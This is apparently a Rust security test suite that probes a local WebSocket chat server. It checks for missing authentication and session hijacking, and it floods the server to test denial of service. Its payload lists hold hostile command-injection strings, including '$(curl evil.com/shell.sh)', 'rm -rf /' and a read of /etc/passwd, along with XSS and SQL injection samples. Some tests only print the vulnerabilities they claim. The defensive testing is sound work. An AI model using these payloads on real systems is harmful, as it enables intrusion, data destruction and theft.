use actix_web::{web, App, HttpServer};
use realtime_service::api::ws_handler;
use realtime_service::services::session_manager::SessionManager;
use tokio_tungstenite::{connect_async, tungstenite::Message};
use futures_util::{SinkExt, StreamExt};
use uuid::Uuid;
use std::time::Duration;

#[cfg(test)]
mod security_tests {
    use super::*;

    async fn start_test_server() -> u16 {
        let manager = web::Data::new(SessionManager::new());

        let server = HttpServer::new(move || {
            App::new()
                .app_data(manager.clone())
                .route("/v1/ws/{session_id}", web::get().to(ws_handler::ws_route))
        })
        .bind(("127.0.0.1", 0))
        .unwrap()
        .run();

        let port = server.addrs().first().unwrap().port();
        tokio::spawn(server);
        tokio::time::sleep(Duration::from_millis(100)).await;
        port
    }

    // ═══════════════════════════════════════════════════════════
    // AUTHENTICATION & AUTHORIZATION TESTS
    // ═══════════════════════════════════════════════════════════

    #[tokio::test]
    async fn test_no_authentication_required() {
        let port = start_test_server().await;
        let session_id = Uuid::new_v4();
        let url = format!("ws://127.0.0.1:{}/v1/ws/{}", port, session_id);

        // ⚠️ CRITICAL VULNERABILITY: Anyone can connect without auth
        let (ws, _) = connect_async(&url).await.expect("Should connect");
        drop(ws);

        println!("⚠️  CRITICAL: No authentication required!");
        println!("⚠️  Anyone can join any session with just the UUID");
    }

    #[tokio::test]
    async fn test_session_uuid_guessing() {
        let port = start_test_server().await;

        // Try predictable UUIDs
        let predictable_uuids = vec![
            "00000000-0000-0000-0000-000000000000",
            "00000000-0000-0000-0000-000000000001",
            "11111111-1111-1111-1111-111111111111",
        ];

        for uuid_str in predictable_uuids {
            let url = format!("ws://127.0.0.1:{}/v1/ws/{}", port, uuid_str);
            
            match connect_async(&url).await {
                Ok((ws, _)) => {
                    drop(ws);
                    println!("⚠️  Connected to predictable UUID: {}", uuid_str);
                }
                Err(_) => {}
            }
        }

        println!("⚠️  Session hijacking possible via UUID guessing");
    }

    #[tokio::test]
    async fn test_unauthorized_session_access() {
        let port = start_test_server().await;
        let session_id = Uuid::new_v4();
        let url = format!("ws://127.0.0.1:{}/v1/ws/{}", port, session_id);

        // User A creates session
        let (mut ws_a, _) = connect_async(&url).await.expect("Failed");

        // Malicious user connects to same session
        let (mut ws_malicious, _) = connect_async(&url).await.expect("Failed");

        // User A sends private message
        let msg = serde_json::json!({
            "msg_type": "text",
            "content": "This should be private"
        });
        ws_a.send(Message::Text(msg.to_string())).await.unwrap();

        // ⚠️ VULNERABILITY: Malicious user receives it
        if let Ok(Some(Ok(Message::Text(text)))) = 
            tokio::time::timeout(Duration::from_secs(1), ws_malicious.next()).await 
        {
            println!("⚠️  CRITICAL: Unauthorized user intercepted message: {}", text);
        }
    }

    // ═══════════════════════════════════════════════════════════
    // INPUT VALIDATION & INJECTION TESTS
    // ═══════════════════════════════════════════════════════════

    #[tokio::test]
    async fn test_xss_injection() {
        let port = start_test_server().await;
        let session_id = Uuid::new_v4();
        let url = format!("ws://127.0.0.1:{}/v1/ws/{}", port, session_id);

        let (mut ws, _) = connect_async(&url).await.expect("Failed");

        let xss_payloads = vec![
            r#"<script>alert('XSS')</script>"#,
            r#"<img src=x onerror="alert('XSS')">"#,
            r#"<svg onload=alert(1)>"#,
            r#"javascript:alert('XSS')"#,
            r#"<iframe src="javascript:alert('XSS')"></iframe>"#,
        ];

        for payload in xss_payloads {
            let msg = serde_json::json!({
                "msg_type": "text",
                "content": payload
            });

            ws.send(Message::Text(msg.to_string())).await.unwrap();

            if let Ok(Some(Ok(Message::Text(text)))) = 
                tokio::time::timeout(Duration::from_millis(100), ws.next()).await 
            {
                if text.contains(payload) {
                    println!("⚠️  XSS VULNERABILITY: Payload echoed unsanitized: {}", payload);
                }
            }
        }
    }

    #[tokio::test]
    async fn test_sql_injection_attempts() {
        let port = start_test_server().await;
        let session_id = Uuid::new_v4();
        let url = format!("ws://127.0.0.1:{}/v1/ws/{}", port, session_id);

        let (mut ws, _) = connect_async(&url).await.expect("Failed");

        let sql_payloads = vec![
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM users--",
        ];

        for payload in sql_payloads {
            let msg = serde_json::json!({
                "msg_type": "text",
                "content": payload
            });

            ws.send(Message::Text(msg.to_string())).await.unwrap();
            println!("⚠️  SQL injection payload accepted: {}", payload);
        }
    }

    #[tokio::test]
    async fn test_command_injection() {
        let port = start_test_server().await;
        let session_id = Uuid::new_v4();
        let url = format!("ws://127.0.0.1:{}/v1/ws/{}", port, session_id);

        let (mut ws, _) = connect_async(&url).await.expect("Failed");

        let cmd_payloads = vec![
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "`whoami`",
            "$(curl evil.com/shell.sh)",
        ];

        for payload in cmd_payloads {
            let msg = serde_json::json!({
                "msg_type": "text",
                "content": payload
            });

            ws.send(Message::Text(msg.to_string())).await.unwrap();
            println!("⚠️  Command injection payload accepted: {}", payload);
        }
    }

    #[tokio::test]
    async fn test_path_traversal() {
        let port = start_test_server().await;
        let session_id = Uuid::new_v4();
        let url = format!("ws://127.0.0.1:{}/v1/ws/{}", port, session_id);

        let (mut ws, _) = connect_async(&url).await.expect("Failed");

        let path_payloads = vec![
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "%2e%2e%2f%2e%2e%2f",
        ];

        for payload in path_payloads {
            let msg = serde_json::json!({
                "msg_type": "text",
                "content": payload
            });

            ws.send(Message::Text(msg.to_string())).await.unwrap();
            println!("⚠️  Path traversal payload accepted: {}", payload);
        }
    }

    // ═══════════════════════════════════════════════════════════
    // DENIAL OF SERVICE (DOS) TESTS
    // ═══════════════════════════════════════════════════════════

    #[tokio::test]
    async fn test_message_size_dos() {
        let port = start_test_server().await;
        let session_id = Uuid::new_v4();
        let url = format!("ws://127.0.0.1:{}/v1/ws/{}", port, session_id);

        let (mut ws, _) = connect_async(&url).await.expect("Failed");

        // Send 10MB message
        let huge_content = "A".repeat(10_000_000);
        let msg = serde_json::json!({
            "msg_type": "text",
            "content": huge_content
        });

        let result = ws.send(Message::Text(msg.to_string())).await;
        
        if result.is_ok() {
            println!("⚠️  DOS VULNERABILITY: 10MB message accepted!");
            println!("⚠️  No message size limit enforced");
        }
    }

    #[tokio::test]
    async fn test_rapid_connection_dos() {
        let port = start_test_server().await;
        let session_id = Uuid::new_v4();

        let mut connections = vec![];
        let start = std::time::Instant::now();

        // Create 100 connections rapidly
        for i in 0..100 {
            let url = format!("ws://127.0.0.1:{}/v1/ws/{}", port, session_id);
            
            match connect_async(&url).await {
                Ok((ws, _)) => connections.push(ws),
                Err(e) => {
                    println!("Connection {} failed: {}", i, e);
                    break;
                }
            }
        }

        let duration = start.elapsed();
        println!("Created {} connections in {:?}", connections.len(), duration);

        if connections.len() >= 100 {
            println!("⚠️  DOS VULNERABILITY: No connection rate limiting!");
        }
    }

    #[tokio::test]
    async fn test_message_flood_dos() {
        let port = start_test_server().await;
        let session_id = Uuid::new_v4();
        let url = format!("ws://127.0.0.1:{}/v1/ws/{}", port, session_id);

        let (mut ws, _) = connect_async(&url).await.expect("Failed");

        let start = std::time::Instant::now();

        // Send 1000 messages as fast as possible
        for _ in 0..1000 {
            let msg = serde_json::json!({
                "msg_type": "text",
                "content": "Flood attack"
            });

            if ws.send(Message::Text(msg.to_string())).await.is_err() {
                break;
            }
        }

        let duration = start.elapsed();
        println!("Sent 1000 messages in {:?}", duration);
        println!("⚠️  DOS VULNERABILITY: No message rate limiting!");
    }

    #[tokio::test]
    async fn test_slowloris_attack() {
        let port = start_test_server().await;
        let session_id = Uuid::new_v4();

        // Create many connections but keep them idle
        let mut connections = vec![];
        for _ in 0..50 {
            let url = format!("ws://127.0.0.1:{}/v1/ws/{}", port, session_id);
            if let Ok((ws, _)) = connect_async(&url).await {
                connections.push(ws);
            }
        }

        // Keep connections alive but idle
        tokio::time::sleep(Duration::from_secs(10)).await;

        println!("⚠️  Slowloris attack: {} idle connections maintained", connections.len());
        println!("⚠️  No idle connection timeout mechanism");
    }

    #[tokio::test]
    async fn test_json_bomb() {
        let port = start_test_server().await;
        let session_id = Uuid::new_v4();
        let url = format!("ws://127.0.0.1:{}/v1/ws/{}", port, session_id);

        let (mut ws, _) = connect_async(&url).await.expect("Failed");

        // Create deeply nested JSON
        let mut bomb = String::from(r#"{"msg_type":"text","content":"#);
        for _ in 0..10000 {
            bomb.push_str(r#"{"a":"#);
        }
        bomb.push_str("value");
        for _ in 0..10000 {
            bomb.push_str("\"}");
        }
        bomb.push_str("\"}");

        let result = ws.send(Message::Text(bomb)).await;
        
        if result.is_ok() {
            println!("⚠️  JSON bomb accepted - may cause CPU exhaustion");
        }
    }

    // ═══════════════════════════════════════════════════════════
    // DATA EXPOSURE TESTS
    // ═══════════════════════════════════════════════════════════

    #[tokio::test]
    async fn test_connection_id_exposure() {
        let port = start_test_server().await;
        let session_id = Uuid::new_v4();
        let url = format!("ws://127.0.0.1:{}/v1/ws/{}", port, session_id);

        let (mut ws, _) = connect_async(&url).await.expect("Failed");

        let msg = serde_json::json!({
            "msg_type": "text",
            "content": "Test"
        });
        ws.send(Message::Text(msg.to_string())).await.unwrap();

        if let Ok(Some(Ok(Message::Text(text)))) = 
            tokio::time::timeout(Duration::from_secs(1), ws.next()).await 
        {
            let json: serde_json::Value = serde_json::from_str(&text).unwrap();
            
            if json.get("sender_id").is_some() {
                println!("⚠️  INFO DISCLOSURE: sender_id exposed in broadcast");
                println!("⚠️  Connection IDs are random usize - potential collision");
            }
        }
    }

    #[tokio::test]
    async fn test_error_message_disclosure() {
        let port = start_test_server().await;
        let session_id = Uuid::new_v4();
        let url = format!("ws://127.0.0.1:{}/v1/ws/{}", port, session_id);

        let (mut ws, _) = connect_async(&url).await.expect("Failed");

        // Send various malformed payloads
        let payloads = vec![
            "not json",
            "{",
            r#"{"msg_type":123}"#,
            "",
        ];

        for payload in payloads {
            ws.send(Message::Text(payload.to_string())).await.ok();
            
            // Check if error details are exposed
            tokio::time::sleep(Duration::from_millis(50)).await;
        }

        println!("⚠️  Check logs for potential information disclosure in error messages");
    }

    // ═══════════════════════════════════════════════════════════
    // PROTOCOL & WEBSOCKET SECURITY
    // ═══════════════════════════════════════════════════════════

    #[tokio::test]
    async fn test_websocket_hijacking() {
        let port = start_test_server().await;
        let session_id = Uuid::new_v4();

        // Attempt connection without proper WebSocket handshake
        let client = reqwest::Client::new();
        let url = format!("http://127.0.0.1:{}/v1/ws/{}", port, session_id);

        let response = client.get(&url)
            .send()
            .await;

        match response {
            Ok(resp) => {
                println!("⚠️  HTTP request to WebSocket endpoint: {:?}", resp.status());
            }
            Err(_) => {}
        }
    }

    #[tokio::test]
    async fn test_cross_protocol_attack() {
        let port = start_test_server().await;
        let session_id = Uuid::new_v4();
        let url = format!("ws://127.0.0.1:{}/v1/ws/{}", port, session_id);

        let (mut ws, _) = connect_async(&url).await.expect("Failed");

        // Try sending HTTP-like payload
        let http_payload = "GET /admin HTTP/1.1\r\nHost: internal.system\r\n\r\n";
        ws.send(Message::Text(http_payload.to_string())).await.ok();

        println!("⚠️  Cross-protocol attack attempt sent");
    }

    #[tokio::test]
    async fn test_origin_validation() {
        // Note: Need to check if Origin header is validated
        // Current implementation likely doesn't validate Origin
        
        println!("⚠️  CSRF VULNERABILITY: No Origin header validation");
        println!("⚠️  WebSocket connections can be initiated from any domain");
    }

    // ═══════════════════════════════════════════════════════════
    // CONCURRENCY & RACE CONDITION TESTS
    // ═══════════════════════════════════════════════════════════

    #[tokio::test]
    async fn test_concurrent_access_race_condition() {
        let port = start_test_server().await;
        let session_id = Uuid::new_v4();

        let mut handles = vec![];

        // Spawn 100 concurrent operations
        for i in 0..100 {
            let session_id = session_id.clone();
            let handle = tokio::spawn(async move {
                let url = format!("ws://127.0.0.1:{}/v1/ws/{}", port, session_id);
                
                if let Ok((mut ws, _)) = connect_async(&url).await {
                    let msg = serde_json::json!({
                        "msg_type": "text",
                        "content": format!("Concurrent {}", i)
                    });

                    ws.send(Message::Text(msg.to_string())).await.ok();
                    tokio::time::sleep(Duration::from_millis(10)).await;
                }
            });

            handles.push(handle);
        }

        for handle in handles {
            handle.await.ok();
        }

        println!("⚠️  Race condition test: Check for data corruption or panics");
    }

    #[tokio::test]
    async fn test_connection_id_collision() {
        let port = start_test_server().await;
        let session_id = Uuid::new_v4();

        // Try to trigger connection ID collision
        // conn_id is random::<usize>() - collisions are possible
        
        let mut connections = vec![];
        for _ in 0..1000 {
            let url = format!("ws://127.0.0.1:{}/v1/ws/{}", port, session_id);
            if let Ok((ws, _)) = connect_async(&url).await {
                connections.push(ws);
            }
        }

        println!("⚠️  Created {} connections - collision possible with random usize", connections.len());
        println!("⚠️  Collision would silently disconnect existing user");
    }

    // ═══════════════════════════════════════════════════════════
    // RESOURCE EXHAUSTION TESTS
    // ═══════════════════════════════════════════════════════════

    #[tokio::test]
    #[ignore] // Resource intensive
    async fn test_memory_exhaustion() {
        let port = start_test_server().await;
        let session_id = Uuid::new_v4();
        let url = format!("ws://127.0.0.1:{}/v1/ws/{}", port, session_id);

        let (mut ws, _) = connect_async(&url).await.expect("Failed");

        // Try to exhaust memory by sending many large messages
        for i in 0..1000 {
            let large = "A".repeat(1_000_000); // 1MB each
            let msg = serde_json::json!({
                "msg_type": "text",
                "content": large
            });

            if ws.send(Message::Text(msg.to_string())).await.is_err() {
                println!("Failed at message {}", i);
                break;
            }

            if i % 100 == 0 {
                println!("Sent {} messages ({}MB total)", i, i);
            }
        }

        println!("⚠️  Memory exhaustion attack completed - check system resources");
    }

    #[tokio::test]
    #[ignore]
    async fn test_cpu_exhaustion() {
        let port = start_test_server().await;
        let session_id = Uuid::new_v4();
        let url = format!("ws://127.0.0.1:{}/v1/ws/{}", port, session_id);

        let (mut ws, _) = connect_async(&url).await.expect("Failed");

        // Send many messages requiring processing
        for _ in 0..10000 {
            let msg = serde_json::json!({
                "msg_type": "text",
                "content": "CPU intensive task"
            });

            ws.send(Message::Text(msg.to_string())).await.ok();
        }

        println!("⚠️  CPU exhaustion attack - monitor CPU usage");
    }

    #[tokio::test]
    async fn test_channel_buffer_overflow() {
        let port = start_test_server().await;
        let session_id = Uuid::new_v4();
        let url = format!("ws://127.0.0.1:{}/v1/ws/{}", port, session_id);

        let (mut ws_sender, _) = connect_async(&url).await.expect("Failed");
        let (mut ws_receiver, _) = connect_async(&url).await.expect("Failed");

        // Send messages faster than receiver can process
        // Channel buffer is only 16 - easy to overflow
        for i in 0..100 {
            let msg = serde_json::json!({
                "msg_type": "text",
                "content": format!("Message {}", i)
            });

            ws_sender.send(Message::Text(msg.to_string())).await.ok();
        }

        // Count received messages
        let mut received = 0;
        while let Ok(Some(Ok(_))) = tokio::time::timeout(Duration::from_millis(50), ws_receiver.next()).await {
            received += 1;
        }

        println!("⚠️  Sent: 100, Received: {} - {} messages lost", received, 100 - received);
        println!("⚠️  Channel buffer overflow causes message loss");
    }

    // ═══════════════════════════════════════════════════════════
    // COMPLIANCE & BEST PRACTICES
    // ═══════════════════════════════════════════════════════════

    #[test]
    fn test_security_headers_missing() {
        println!("⚠️  MISSING SECURITY HEADERS:");
        println!("    - No CSP (Content-Security-Policy)");
        println!("    - No X-Frame-Options");
        println!("    - No X-Content-Type-Options");
        println!("    - No Strict-Transport-Security");
        println!("    - No authentication/authorization");
    }

    #[test]
    fn test_logging_security() {
        println!("⚠️  LOGGING SECURITY ISSUES:");
        println!("    - Passwords/tokens might be logged");
        println!("    - No log sanitization");
        println!("    - Sensitive data in debug output");
        println!("    - No structured logging");
    }

    #[test]
    fn test_encryption_at_rest() {
        println!("⚠️  NO ENCRYPTION AT REST:");
        println!("    - Messages not encrypted in memory");
        println!("    - Session data not encrypted");
        println!("    - No message persistence encryption");
    }

    #[test]
    fn test_tls_configuration() {
        println!("⚠️  TLS CONFIGURATION:");
        println!("    - Service uses ws:// not wss://");
        println!("    - No TLS/SSL encryption");
        println!("    - Messages sent in plaintext");
        println!("    - Vulnerable to MITM attacks");
    }
}